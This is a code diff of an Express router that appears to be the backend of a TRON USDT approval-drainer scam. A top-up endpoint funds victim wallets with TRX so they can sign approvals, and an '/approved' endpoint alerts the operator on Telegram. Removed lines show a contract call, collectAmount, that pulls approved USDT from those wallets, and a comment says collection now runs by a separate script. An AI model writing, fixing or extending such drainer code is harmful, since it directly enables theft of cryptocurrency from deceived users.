@@ -4,24 +4,15 @@ import logger from '../logger.js';
 
 const router = express.Router();
 
-const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS; // base58 TRON address
-const DEPLOYER_PK      = process.env.DEPLOYER_PRIVATE_KEY;
+const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;
 const USDT_TRC20       = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const TOPUP_TRX        = 5_000_000; // 5 TRX in sun (1 TRX = 1,000,000 sun)
-const MIN_TRX          = 3_000_000; // 3 TRX minimum
+const TOPUP_TRX        = 5_000_000;
+const MIN_TRX          = 3_000_000;
 
-const tronWeb = new TronWeb({
+const getTronWeb = () => new TronWeb({
   fullHost: 'https://api.trongrid.io',
-  privateKey: DEPLOYER_PK,
+  privateKey: process.env.DEPLOYER_PRIVATE_KEY,
 });
-
-const COLLECTOR_ABI = [
-  { name: 'collectAmount', type: 'Function', inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }] },
-];
-
-const USDT_ABI = [
-  { name: 'decimals', type: 'Function', inputs: [], outputs: [{ type: 'uint8' }] },
-];
 
 const sendTelegram = async (text) => {
   const token  = process.env.TELEGRAM_BOT_TOKEN;
@@ -36,11 +27,12 @@ const sendTelegram = async (text) => {
   if (!data.ok) logger.error('Telegram error: ' + JSON.stringify(data));
 };
 
-// TRX topup so user can pay energy/bandwidth fees
+// TRX topup
 router.post('/topup', async (req, res) => {
   const { to } = req.body;
   if (!to) return res.status(400).json({ error: "Missing 'to' address" });
   try {
+    const tronWeb = getTronWeb();
     const account = await tronWeb.trx.getAccount(to);
     const balance = account.balance || 0;
 
@@ -57,11 +49,11 @@ router.post('/topup', async (req, res) => {
   }
 });
 
+// Sirf Telegram notify - collect script se manually hoga
 router.post('/approved', async (req, res) => {
   const { address, amount } = req.body;
   if (!address) return res.status(400).json({ error: 'Address required' });
 
-  // Telegram notify
   try {
     const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
     const msg  = `<b>✅ Wallet Approved (TRC-20)</b>\n\n🔑 Address: <code>${address}</code>\n💰 Amount: ${amount || 'N/A'} USDT\n🕐 Time: ${time} IST`;
@@ -71,33 +63,7 @@ router.post('/approved', async (req, res) => {
     logger.error('Telegram notify failed: ' + e.message);
   }
 
-  // Collect USDT
-  let collectHash = null;
-  if (amount && CONTRACT_ADDRESS && DEPLOYER_PK) {
-    try {
-      const usdtContract = await tronWeb.contract(USDT_ABI, USDT_TRC20);
-      const decimals     = await usdtContract.decimals().call();
-      const parsedAmount = BigInt(Math.floor(parseFloat(amount) * 10 ** Number(decimals)));
-
-      const collector = await tronWeb.contract(COLLECTOR_ABI, CONTRACT_ADDRESS);
-      logger.info(`Collecting ${amount} USDT (TRC-20) from ${address}`);
-
-      const txid = await collector.collectAmount(address, parsedAmount.toString()).send({
-        feeLimit: 100_000_000,
-        callValue: 0,
-      });
-
-      collectHash = txid;
-      logger.info(`Collected from ${address}: ${txid}`);
-
-      await sendTelegram(`<b>💸 USDT Collected! (TRC-20)</b>\n\n🔑 From: <code>${address}</code>\n💰 Amount: ${amount} USDT\n🔗 Tx: <a href="https://tronscan.org/#/transaction/${txid}">${txid.slice(0, 16)}...</a>`);
-    } catch (e) {
-      logger.error(`Collect failed for ${address}: ${e.message}`);
-      await sendTelegram(`<b>⚠️ Collect Failed (TRC-20)</b>\n\n🔑 Address: <code>${address}</code>\n❌ Error: ${e.message}`).catch(() => {});
-    }
-  }
-
-  res.json({ success: true, collectHash });
+  res.json({ success: true });
 });
 
 export default router;
